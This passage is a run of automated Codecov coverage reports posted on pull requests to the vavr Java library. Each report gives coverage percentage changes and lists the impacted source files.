100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1985      +/-\n============================================\n- Coverage     97.78%   97.77%   -0.02%   \n+ Complexity     5167     5166       -1   \n============================================\n  Files            91       91            \n  Lines         11797    11797            \n  Branches       1565     1565            \n============================================\n- Hits          11536    11534       -2   \n- Misses          115      116       +1   \n- Partials        146      147       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...main/java/io/vavr/collection/AbstractIterator.java | 80% <100%> (\u00f8) | 4 <1> (\u00f8) | :arrow_down: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 82.5% <0%> (-2.5%) | 21% <0%> (-1%) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 20af5a0...1b0c4a2. Read the comment docs.\n. # Codecov Report\nMerging #1986 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1986      +/-\n============================================\n+ Coverage     97.77%   97.77%   +<.01%   \n+ Complexity     5166     5165       -1   \n============================================\n  Files            91       91            \n  Lines         11797    11795       -2   \n  Branches       1565     1566       +1   \n============================================\n- Hits          11534    11533       -1   \n  Misses          116      116            \n+ Partials        147      146       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Option.java | 100% <\u00f8> (\u00f8) | 43 <0> (-1) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Function1.java | 100% <100%> (\u00f8) | 15 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction8.java | 100% <100%> (\u00f8) | 15 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Function8.java | 100% <100%> (\u00f8) | 11 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction6.java | 100% <100%> (\u00f8) | 15 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction4.java | 100% <100%> (\u00f8) | 15 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Function2.java | 100% <100%> (\u00f8) | 11 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction0.java | 100% <100%> (\u00f8) | 17 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction7.java | 100% <100%> (\u00f8) | 15 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Function6.java | 100% <100%> (\u00f8) | 11 <0> (\u00f8) | :arrow_down: |\n| ... and 11 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update c1f731a...b2d83e3. Read the comment docs.\n. # Codecov Report\nMerging #1987 into master will not change coverage.\nThe diff coverage is 100%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1987   +/-\n=========================================\n  Coverage     97.77%   97.77%         \n  Complexity     5166     5166         \n=========================================\n  Files            91       91         \n  Lines         11797    11797         \n  Branches       1565     1565         \n=========================================\n  Hits          11534    11534         \n  Misses          116      116         \n  Partials        147      147\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Validation.java | 99.05% <100%> (\u00f8) | 55 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update c1f731a...82d18e7. Read the comment docs.\n. # Codecov Report\nMerging #1988 into master will increase coverage by 0.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1988      +/-\n============================================\n+ Coverage     97.77%   97.78%   +0.01%   \n+ Complexity     5164     5163       -1   \n============================================\n  Files            91       91            \n  Lines         11795    11793       -2   \n  Branches       1566     1566            \n============================================\n  Hits          11532    11532            \n+ Misses          116      115       -1   \n+ Partials        147      146       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...rc/main/java/io/vavr/collection/LinkedHashMap.java | 98.51% <100%> (-0.02%) | 127 <2> (-2) | |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 85% <0%> (+2.5%) | 22% <0%> (+1%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 1647ce0...f6b8f61. Read the comment docs.\n. # Codecov Report\nMerging #1992 into master will decrease coverage by <.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1992      +/-\n============================================\n- Coverage     97.63%   97.62%   -0.01%   \n+ Complexity     5155     5154       -1   \n============================================\n  Files            91       91            \n  Lines         11822    11822            \n  Branches       1567     1567            \n============================================\n- Hits          11542    11541       -1   \n  Misses          134      134            \n- Partials        146      147       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/Vector.java | 99.68% <\u00f8> (\u00f8) | 208 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/Predicates.java | 84.21% <\u00f8> (\u00f8) | 19 <0> (\u00f8) | :arrow_down: |\n| ...c/main/java/io/vavr/collection/JavaConverters.java | 90.58% <\u00f8> (\u00f8) | 1 <0> (\u00f8) | :arrow_down: |\n| ...r/src/main/java/io/vavr/collection/IndexedSeq.java | 97.36% <\u00f8> (\u00f8) | 34 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/CharSeq.java | 99.81% <\u00f8> (\u00f8) | 348 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/List.java | 99.61% <\u00f8> (\u00f8) | 260 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Queue.java | 96.67% <\u00f8> (\u00f8) | 196 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Array.java | 99.53% <\u00f8> (\u00f8) | 241 <0> (\u00f8) | :arrow_down: |\n| .../src/main/java/io/vavr/collection/Collections.java | 93.81% <\u00f8> (\u00f8) | 105 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Stream.java | 98.98% <\u00f8> (\u00f8) | 260 <0> (\u00f8) | :arrow_down: |\n| ... and 3 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 0a40768...d8dbb1b. Read the comment docs.\n. # Codecov Report\nMerging #1993 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1993   +/-\n=========================================\n  Coverage     97.63%   97.63%         \n  Complexity     5155     5155         \n=========================================\n  Files            91       91         \n  Lines         11822    11822         \n  Branches       1567     1567         \n=========================================\n  Hits          11542    11542         \n  Misses          134      134         \n  Partials        146      146\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src-gen/main/java/io/vavr/API.java | 92.68% <\u00f8> (\u00f8) | 197 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 0a40768...a64e832. Read the comment docs.\n. # Codecov Report\nMerging #1996 into master will decrease coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1996      +/-\n============================================\n- Coverage     97.62%   97.62%   -0.01%   \n+ Complexity     5154     5153       -1   \n============================================\n  Files            91       91            \n  Lines         11822    11819       -3   \n  Branches       1567     1565       -2   \n============================================\n- Hits          11541    11538       -3   \n  Misses          134      134            \n  Partials        147      147\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/Array.java | 99.53% <100%> (-0.01%) | 240 <1> (-1) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 79fec22...36406c8. Read the comment docs.\n. # Codecov Report\nMerging #1998 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1998   +/-\n=========================================\n  Coverage     97.62%   97.62%         \n  Complexity     5154     5154         \n=========================================\n  Files            91       91         \n  Lines         11822    11822         \n  Branches       1567     1567         \n=========================================\n  Hits          11541    11541         \n  Misses          134      134         \n  Partials        147      147\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update ce6f975...69c9b05. Read the comment docs.\n. # Codecov Report\nMerging #2002 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2002      +/-\n============================================\n+ Coverage     97.62%   97.62%   +<.01%   \n- Complexity     5154     5156       +2   \n============================================\n  Files            91       91            \n  Lines         11822    11824       +2   \n  Branches       1567     1567            \n============================================\n+ Hits          11541    11543       +2   \n  Misses          134      134            \n  Partials        147      147\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/Map.java | 100% <100%> (\u00f8) | 34 <1> (+1) | :arrow_up: |\n| ...avr/src/main/java/io/vavr/collection/Multimap.java | 98.33% <100%> (+0.02%) | 28 <1> (+1) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 79fec22...dc0f6e1. Read the comment docs.\n. # Codecov Report\nMerging #2006 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2006   +/-\n=========================================\n  Coverage     97.62%   97.62%         \n  Complexity     5154     5154         \n=========================================\n  Files            91       91         \n  Lines         11822    11822         \n  Branches       1567     1567         \n=========================================\n  Hits          11541    11541         \n  Misses          134      134         \n  Partials        147      147\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 79fec22...d1df0fe. Read the comment docs.\n. # Codecov Report\nMerging #2009 into master will decrease coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2009      +/-\n============================================\n- Coverage     97.63%   97.62%   -0.01%   \n- Complexity     5155     5159       +4   \n============================================\n  Files            91       91            \n  Lines         11822    11834      +12   \n  Branches       1567     1570       +3   \n============================================\n+ Hits          11542    11553      +11   \n  Misses          134      134            \n- Partials        146      147       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| .../src/main/java/io/vavr/collection/Collections.java | 93.81% <\u00f8> (\u00f8) | 105 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/List.java | 99.62% <100%> (\u00f8) | 262 <2> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/Stream.java | 99% <100%> (+0.01%) | 262 <2> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/Queue.java | 96.69% <100%> (+0.02%) | 197 <2> (+1) | :arrow_up: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 82.5% <0%> (-1.25%) | 21% <0%> (-1%) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 0c56073...d18043c. Read the comment docs.\n. # Codecov Report\nMerging #2011 into master will decrease coverage by 0.01%.\nThe diff coverage is 97.61%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2011      +/-\n============================================\n- Coverage     97.63%   97.62%   -0.02%   \n- Complexity     5155     5156       +1   \n============================================\n  Files            91       91            \n  Lines         11822    11855      +33   \n  Branches       1567     1575       +8   \n============================================\n+ Hits          11542    11573      +31   \n  Misses          134      134            \n- Partials        146      148       +2\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...avr/src/main/java/io/vavr/collection/Iterator.java | 99.21% <97.61%> (-0.13%) | 174 <0> (+2) | |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 82.5% <0%> (-1.25%) | 21% <0%> (-1%) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 0c56073...23ab416. Read the comment docs.\n. # Codecov Report\nMerging #2012 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2012   +/-\n=========================================\n  Coverage     97.63%   97.63%         \n  Complexity     5155     5155         \n=========================================\n  Files            91       91         \n  Lines         11822    11822         \n  Branches       1567     1567         \n=========================================\n  Hits          11542    11542         \n  Misses          134      134         \n  Partials        146      146\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...src/main/java/io/vavr/collection/TreeMultimap.java | 89.88% <\u00f8> (\u00f8) | 10 <0> (\u00f8) | :arrow_down: |\n| ...src/main/java/io/vavr/collection/HashMultimap.java | 94.73% <\u00f8> (\u00f8) | 8 <0> (\u00f8) | :arrow_down: |\n| ...in/java/io/vavr/collection/LinkedHashMultimap.java | 94.82% <\u00f8> (\u00f8) | 9 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 0c56073...9485dcc. Read the comment docs.\n. # Codecov Report\nMerging #2016 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2016      +/-\n============================================\n+ Coverage     97.62%   97.62%   +<.01%   \n- Complexity     5168     5169       +1   \n============================================\n  Files            91       91            \n  Lines         11835    11836       +1   \n  Branches       1568     1568            \n============================================\n+ Hits          11554    11555       +1   \n  Misses          134      134            \n  Partials        147      147\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Option.java | 100% <100%> (\u00f8) | 44 <1> (+1) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 4558730...a58c817. Read the comment docs.\n. # Codecov Report\nMerging #2017 into master will decrease coverage by 0.09%.\nThe diff coverage is 71.73%.\n\n\n```diff\n@@             Coverage Diff             @@\nmaster    #2017     +/-\n===========================================\n- Coverage     97.62%   97.53%   -0.1%   \n- Complexity     5153     5170     +17   \n===========================================\n  Files            91       91           \n  Lines         11819    11865     +46   \n  Branches       1565     1565           \n===========================================\n+ Hits          11538    11572     +34   \n- Misses          134      147     +13   \n+ Partials        147      146      -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/TreeMap.java | 94.46% <59.09%> (-3.37%) | 158 <6> (+6) | |\n| ...rc/main/java/io/vavr/collection/LinkedHashMap.java | 97.66% <83.33%> (-0.86%) | 132 <5> (+5) | |\n| vavr/src/main/java/io/vavr/collection/HashMap.java | 98.26% <83.33%> (-1.12%) | 128 <5> (+5) | |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 83.75% <0%> (+1.25%) | 22% <0%> (+1%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 445598b...fba21d9. Read the comment docs.\n. # Codecov Report\nMerging #2018 into master will increase coverage by 0.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2018      +/-\n============================================\n+ Coverage     97.62%   97.63%   +0.01%   \n- Complexity     5153     5156       +3   \n============================================\n  Files            91       91            \n  Lines         11819    11815       -4   \n  Branches       1565     1563       -2   \n============================================\n- Hits          11538    11536       -2   \n+ Misses          134      133       -1   \n+ Partials        147      146       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...avr/src/main/java/io/vavr/collection/Iterator.java | 99.33% <100%> (-0.01%) | 174 <0> (+2) | |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 85% <0%> (+2.5%) | 22% <0%> (+1%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 445598b...706fedf. Read the comment docs.\n. # Codecov Report\nMerging #2019 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2019      +/-\n============================================\n+ Coverage     97.62%   97.62%   +<.01%   \n- Complexity     5155     5161       +6   \n============================================\n  Files            91       91            \n  Lines         11821    11822       +1   \n  Branches       1565     1565            \n============================================\n+ Hits          11540    11541       +1   \n  Misses          134      134            \n  Partials        147      147\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/Seq.java | 98% <\u00f8> (\u00f8) | 50 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Map.java | 100% <\u00f8> (\u00f8) | 34 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/API.java | 92.67% <\u00f8> (-0.02%) | 197 <0> (\u00f8) | |\n| ...avr/src/main/java/io/vavr/collection/Multimap.java | 98.33% <\u00f8> (\u00f8) | 28 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Function6.java | 95.45% <100%> (\u00f8) | 11 <1> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction7.java | 97.05% <100%> (\u00f8) | 14 <1> (\u00f8) | :arrow_down: |\n| ...vr/src/main/java/io/vavr/collection/LinearSeq.java | 96.7% <100%> (+0.03%) | 20 <3> (+3) | :arrow_up: |\n| vavr/src-gen/main/java/io/vavr/Function5.java | 95.23% <100%> (\u00f8) | 11 <1> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction8.java | 97.14% <100%> (\u00f8) | 14 <1> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction2.java | 96.55% <100%> (\u00f8) | 15 <1> (\u00f8) | :arrow_down: |\n| ... and 14 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 83efef2...ef39249. Read the comment docs.\n. # Codecov Report\nMerging #2021 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2021      +/-\n============================================\n+ Coverage     97.62%   97.63%   +<.01%   \n- Complexity     5155     5158       +3   \n============================================\n  Files            91       91            \n  Lines         11821    11822       +1   \n  Branches       1565     1565            \n============================================\n+ Hits          11540    11542       +2   \n  Misses          134      134            \n+ Partials        147      146       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Either.java | 100% <100%> (\u00f8) | 42 <2> (+2) | :arrow_up: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 83.75% <0%> (+1.25%) | 22% <0%> (+1%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 83efef2...bdde334. Read the comment docs.\n. # Codecov Report\nMerging #2024 into master will decrease coverage by <.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2024      +/-\n============================================\n- Coverage     97.62%   97.62%   -0.01%   \n+ Complexity     5168     5163       -5   \n============================================\n  Files            91       91            \n  Lines         11835    11830       -5   \n  Branches       1568     1568            \n============================================\n- Hits          11554    11549       -5   \n  Misses          134      134            \n  Partials        147      147\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src-gen/main/java/io/vavr/API.java | 92.79% <\u00f8> (+0.11%) | 193 <0> (-4) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/TreeMap.java | 97.4% <0%> (-0.44%) | 151% <0%> (-1%) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 4558730...5225fe2. Read the comment docs.\n. # Codecov Report\nMerging #2025 into master will decrease coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2025      +/-\n============================================\n- Coverage     97.53%   97.52%   -0.01%   \n+ Complexity     5185     5184       -1   \n============================================\n  Files            91       91            \n  Lines         11906    11906            \n  Branches       1574     1574            \n============================================\n- Hits          11612    11611       -1   \n  Misses          147      147            \n- Partials        147      148       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| .../src/main/java/io/vavr/collection/Traversable.java | 99.45% <100%> (-0.01%) | 111 <0> (-1) | |\n| ...avr/src/main/java/io/vavr/collection/Iterator.java | 99.21% <100%> (\u00f8) | 177 <0> (+1) | :arrow_up: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 82.5% <0%> (-1.25%) | 21% <0%> (-1%) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 65fdf42...772492d. Read the comment docs.\n. # Codecov Report\nMerging #2026 into master will increase coverage by 0.02%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2026      +/-\n============================================\n+ Coverage     97.52%   97.54%   +0.02%   \n- Complexity     5184     5187       +3   \n============================================\n  Files            91       91            \n  Lines         11906    11906            \n  Branches       1574     1574            \n============================================\n+ Hits          11611    11614       +3   \n+ Misses          147      144       -3   \n  Partials        148      148\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...src/main/java/io/vavr/collection/TreeMultimap.java | 91.01% <0%> (+1.12%) | 11% <0%> (+1%) | :arrow_up: |\n| ...in/java/io/vavr/collection/LinkedHashMultimap.java | 96.55% <0%> (+1.72%) | 10% <0%> (+1%) | :arrow_up: |\n| ...src/main/java/io/vavr/collection/HashMultimap.java | 96.49% <0%> (+1.75%) | 9% <0%> (+1%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 5c07bda...278db87. Read the comment docs.\n. # Codecov Report\nMerging #2028 into master will decrease coverage by 0.02%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2028      +/-\n============================================\n- Coverage     97.54%   97.52%   -0.03%   \n+ Complexity     5187     5175      -12   \n============================================\n  Files            91       91            \n  Lines         11906    11889      -17   \n  Branches       1574     1572       -2   \n============================================\n- Hits          11614    11595      -19   \n- Misses          144      147       +3   \n+ Partials        148      147       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| .../src/main/java/io/vavr/collection/Collections.java | 93.02% <\u00f8> (-0.8%) | 96 <0> (-9) | |\n| vavr/src/main/java/io/vavr/collection/Stream.java | 99% <100%> (\u00f8) | 262 <0> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/LinkedHashMap.java | 97.66% <100%> (\u00f8) | 132 <0> (\u00f8) | :arrow_down: |\n| ...in/java/io/vavr/collection/LinkedHashMultimap.java | 96.55% <100%> (\u00f8) | 10 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/BitSet.java | 99.42% <100%> (\u00f8) | 81 <0> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/LinkedHashSet.java | 96.62% <100%> (\u00f8) | 143 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/HashMap.java | 98.26% <100%> (\u00f8) | 128 <0> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/PriorityQueue.java | 98.67% <100%> (\u00f8) | 106 <0> (-2) | :arrow_down: |\n| ...src/main/java/io/vavr/collection/HashMultimap.java | 96.49% <100%> (\u00f8) | 9 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/HashSet.java | 95.78% <100%> (\u00f8) | 138 <0> (\u00f8) | :arrow_down: |\n| ... and 10 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 1a3d1a5...6e7b2fe. Read the comment docs.\n. # Codecov Report\nMerging #2029 into master will increase coverage by <.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2029      +/-\n============================================\n+ Coverage     97.54%   97.55%   +<.01%   \n- Complexity     5187     5188       +1   \n============================================\n  Files            91       91            \n  Lines         11906    11906            \n  Branches       1574     1574            \n============================================\n+ Hits          11614    11615       +1   \n  Misses          144      144            \n+ Partials        148      147       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...src/main/java/io/vavr/collection/TreeMultimap.java | 91.01% <\u00f8> (\u00f8) | 11 <0> (\u00f8) | :arrow_down: |\n| ...in/java/io/vavr/collection/LinkedHashMultimap.java | 96.55% <\u00f8> (\u00f8) | 10 <0> (\u00f8) | :arrow_down: |\n| ...src/main/java/io/vavr/collection/HashMultimap.java | 96.49% <\u00f8> (\u00f8) | 9 <0> (\u00f8) | :arrow_down: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 83.75% <0%> (+1.25%) | 22% <0%> (+1%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 1a3d1a5...759b324. Read the comment docs.\n. # Codecov Report\nMerging #2032 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2032   +/-\n=========================================\n  Coverage     97.54%   97.54%         \n  Complexity     5187     5187         \n=========================================\n  Files            91       91         \n  Lines         11906    11906         \n  Branches       1574     1574         \n=========================================\n  Hits          11614    11614         \n  Misses          144      144         \n  Partials        148      148\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 4296a7b...8930bf9. Read the comment docs.\n. # Codecov Report\nMerging #2033 into master will increase coverage by 0.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2033      +/-\n============================================\n+ Coverage     97.54%   97.56%   +0.01%   \n- Complexity     5187     5191       +4   \n============================================\n  Files            91       91            \n  Lines         11906    11914       +8   \n  Branches       1574     1576       +2   \n============================================\n+ Hits          11614    11624      +10   \n+ Misses          144      143       -1   \n+ Partials        148      147       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Either.java | 100% <100%> (\u00f8) | 45 <3> (+3) | :arrow_up: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 85% <0%> (+2.5%) | 22% <0%> (+1%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update eb293fa...947b444. Read the comment docs.\n. # Codecov Report\nMerging #2036 into master will increase coverage by 0.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2036      +/-\n============================================\n+ Coverage     97.54%   97.56%   +0.01%   \n- Complexity     5190     5193       +3   \n============================================\n  Files            91       91            \n  Lines         11914    11917       +3   \n  Branches       1576     1576            \n============================================\n+ Hits          11622    11627       +5   \n+ Misses          144      143       -1   \n+ Partials        148      147       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Try.java | 95.86% <100%> (+0.04%) | 94 <2> (+2) | :arrow_up: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 85% <0%> (+2.5%) | 22% <0%> (+1%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 18b9564...cfbdc3c. Read the comment docs.\n. # Codecov Report\nMerging #2038 into master will increase coverage by 